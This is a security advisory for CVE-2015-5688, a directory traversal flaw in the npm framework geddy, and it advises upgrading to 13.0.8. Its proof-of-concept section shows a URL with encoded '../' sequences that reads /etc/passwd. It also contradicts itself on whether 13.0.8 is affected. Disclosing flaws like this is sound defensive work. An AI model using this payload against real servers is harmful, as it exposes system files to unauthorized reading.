# [H] Directory Traversal in geddy

## Summary
Severity: High
Advisory: GHSA-333x-9vgq-v2j4
CVE: CVE-2015-5688
CWE: CWE-22
Ecosystem: npm
Published: 2017-10-24
Source: https://github.com/advisories/GHSA-333x-9vgq-v2j4
Type: github-advisory

## Affected
- npm: `geddy` — affected >=0 <13.0.8

## Details
Versions 13.0.8 and earlier of geddy are vulnerable to a directory traversal attack via URI encoded attack vectors.

### Proof of Concept
```
http://localhost:4000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
```


## Recommendation

Update geddy to version >= 13.0.8

## References
- https://nvd.nist.gov/vuln/detail/CVE-2015-5688
- https://github.com/geddy/geddy/issues/697
- https://github.com/geddy/geddy/pull/699
- https://github.com/geddy/geddy/commit/2de63b68b3aa6c08848f261ace550a37959ef231
- https://github.com/advisories/GHSA-333x-9vgq-v2j4
- https://github.com/geddy/geddy
- https://github.com/geddy/geddy/releases/tag/v13.0.8
- https://www.npmjs.com/advisories/10
